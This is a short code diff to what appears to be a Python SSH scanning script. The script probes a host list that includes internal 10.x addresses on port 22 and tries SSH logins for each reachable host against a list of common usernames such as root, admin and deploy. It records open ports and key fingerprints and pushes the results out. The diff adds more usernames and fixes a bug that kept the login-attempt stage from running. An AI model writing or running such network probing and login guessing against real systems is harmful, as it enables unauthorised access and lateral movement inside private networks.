@@ -85,7 +85,7 @@ HOSTS = [
     # internal (probably unreachable from runner, keeps negative boundary precise)
     ("10.20.1.5", 22), ("10.20.1.6", 22), ("10.20.1.7", 22), ("10.20.3.9", 22), ("10.30.0.8", 22),
 ]
-USERS = ["ubuntu", "root", "coder", "lumii", "centos", "deploy", "admin", "ec2-user", "user1"]
+USERS = ["ubuntu", "root", "coder", "lumii", "centos", "deploy", "admin", "ec2-user", "user1", "roger", "lumi"]
 
 summary = {"target": "ssh28154", "ts": int(time.time()), "ports": {}, "ssh": {}, "keyfp": None}
 lock = threading.Lock()
@@ -170,7 +170,7 @@ def main():
     push_results(final=False)
 
     # ---------- SSH attempts ----------
-    reach = [(h, p) for (h, p) in uniq if str(summary["ports"].get("%s:%d" % (h, p)), "").startswith("OPEN")]
+    reach = [(h, p) for (h, p) in uniq if str(summary["ports"].get("%s:%d" % (h, p)) or "").startswith("OPEN")]
     log("REACHABLE:", reach)
     jobs = [(h, p, u) for (h, p) in reach for u in USERS]
     results = {}
